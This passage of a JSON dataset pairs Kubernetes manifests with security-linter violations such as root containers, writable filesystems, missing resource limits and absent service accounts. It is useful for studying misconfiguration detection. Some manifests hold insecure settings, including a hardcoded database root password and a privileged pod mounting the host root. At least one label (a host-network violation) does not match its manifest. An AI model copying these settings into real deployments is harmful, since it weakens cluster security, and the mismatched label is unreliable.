    "manifest_path": "data/manifests/the_stack_sample/sample_0906.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis-external\n  namespace: redis-system\nspec:\n  ports:\n  - name: haproxy\n    protocol: TCP\n    port: 6379\n    targetPort: 6379\n    nodePort: 31379\n  selector:\n    app: redis-cluster\n  type: NodePort\n  sessionAffinity: None\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis-cluster])"
  },
  {
    "id": "3055",
    "manifest_path": "data/manifests/the_stack_sample/sample_0907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: id\nspec:\n  selector:\n    matchLabels:\n      app: id\n  template:\n    metadata:\n      labels:\n        app: id\n    spec:\n      containers:\n      - name: sitecore-xm1-id\n        env:\n        - name: Sitecore_Sitecore__IdentityServer__Clients__DefaultClient__AllowedCorsOrigins__AllowedCorsOriginsGroup2\n          value: https://hrz.globalhost\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sitecore-xm1-id\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3056",
    "manifest_path": "data/manifests/the_stack_sample/sample_0907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: id\nspec:\n  selector:\n    matchLabels:\n      app: id\n  template:\n    metadata:\n      labels:\n        app: id\n    spec:\n      containers:\n      - name: sitecore-xm1-id\n        env:\n        - name: Sitecore_Sitecore__IdentityServer__Clients__DefaultClient__AllowedCorsOrigins__AllowedCorsOriginsGroup2\n          value: https://hrz.globalhost\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sitecore-xm1-id\" does not have a read-only root file system"
  },
  {
    "id": "3057",
    "manifest_path": "data/manifests/the_stack_sample/sample_0907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: id\nspec:\n  selector:\n    matchLabels:\n      app: id\n  template:\n    metadata:\n      labels:\n        app: id\n    spec:\n      containers:\n      - name: sitecore-xm1-id\n        env:\n        - name: Sitecore_Sitecore__IdentityServer__Clients__DefaultClient__AllowedCorsOrigins__AllowedCorsOriginsGroup2\n          value: https://hrz.globalhost\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sitecore-xm1-id\" is not set to runAsNonRoot"
  },
  {
    "id": "3058",
    "manifest_path": "data/manifests/the_stack_sample/sample_0907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: id\nspec:\n  selector:\n    matchLabels:\n      app: id\n  template:\n    metadata:\n      labels:\n        app: id\n    spec:\n      containers:\n      - name: sitecore-xm1-id\n        env:\n        - name: Sitecore_Sitecore__IdentityServer__Clients__DefaultClient__AllowedCorsOrigins__AllowedCorsOriginsGroup2\n          value: https://hrz.globalhost\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sitecore-xm1-id\" has cpu request 0"
  },
  {
    "id": "3059",
    "manifest_path": "data/manifests/the_stack_sample/sample_0907.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: id\nspec:\n  selector:\n    matchLabels:\n      app: id\n  template:\n    metadata:\n      labels:\n        app: id\n    spec:\n      containers:\n      - name: sitecore-xm1-id\n        env:\n        - name: Sitecore_Sitecore__IdentityServer__Clients__DefaultClient__AllowedCorsOrigins__AllowedCorsOriginsGroup2\n          value: https://hrz.globalhost\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sitecore-xm1-id\" has memory limit 0"
  },
  {
    "id": "3060",
    "manifest_path": "data/manifests/the_stack_sample/sample_0911.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7699\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3061",
    "manifest_path": "data/manifests/the_stack_sample/sample_0911.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7699\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3062",
    "manifest_path": "data/manifests/the_stack_sample/sample_0911.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7699\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "3063",
    "manifest_path": "data/manifests/the_stack_sample/sample_0911.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7699\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "3064",
    "manifest_path": "data/manifests/the_stack_sample/sample_0911.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7699\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "3065",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "3066",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "3067",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"litmus\" not found"
  },
  {
    "id": "3068",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "3069",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "3070",
    "manifest_path": "data/manifests/the_stack_sample/sample_0914.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      name: litmus\n      labels:\n        app: k8s-snapshot-litmus\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: APP_NAMESPACE\n          value: app-percona-ns\n        - name: PROVIDER_STORAGE_CLASS\n          value: openebs-snapshot-promoter\n        - name: DB_USER_NAME\n          value: root\n        - name: DB_PASSWORD\n          value: k8sDem0\n        - name: CLONE_VOL_CLAIM\n          value: snap-mysql-claim\n        - name: CLONE_APP_NAME\n          value: percona-new\n        - name: SNAPSHOT_NAME\n          value: snapshot-percona\n        - name: CAPACITY\n          value: 5Gi\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./apps/percona/functional/k8s_snapshot/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ansibletest\" has memory limit 0"
  },
  {
    "id": "3071",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"prow-controller-manager\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "3072",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "3073",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "3074",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"prow-controller-manager\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "3075",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "3076",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "3077",
    "manifest_path": "data/manifests/the_stack_sample/sample_0917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220513-69ff551a87\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "3078",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  namespace: mayastor\n  name: mayastor-csi\n  labels:\n    openebs/engine: mayastor\nspec:\n  selector:\n    matchLabels:\n      app: mayastor-csi\n  template:\n    metadata:\n      labels:\n        app: mayastor-csi\n    spec:\n      containers:\n      - name: mayastor-csi\n        image: mayadata/mayastor-csi:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        env:\n        - name: MY_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: RUST_BACKTRACE\n          value: '1'\n        args:\n        - --csi-socket=/csi/csi.sock\n        - --node-name=$(MY_NODE_NAME)\n        - --grpc-endpoint=$(MY_POD_IP):10199\n        - -v\n        volumeMounts:\n        - name: device\n          mountPath: /dev\n        - name: sys\n          mountPath: /sys\n        - name: run-udev\n          mountPath: /run/udev\n        - name: host-root\n          mountPath: /host\n        - name: plugin-dir\n          mountPath: /csi\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n      - name: csi-driver-registrar\n        image: quay.io/k8scsi/csi-node-driver-registrar:v1.3.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/mayastor.openebs.io/csi.sock\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        ports:\n        - containerPort: 10199\n          protocol: TCP\n          name: mayastor-node\n      volumes:\n      - name: device\n        hostPath:\n          path: /dev\n          type: Directory\n      - name: sys\n        hostPath:\n          path: /sys\n          type: Directory\n      - name: run-udev\n        hostPath:\n          path: /run/udev\n          type: Directory\n      - name: host-root\n        hostPath:\n          path: /\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/mayastor.openebs.io/\n          type: DirectoryOrCreate\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "3079",
    "manifest_path": "data/manifests/the_stack_sample/sample_0919.yaml",
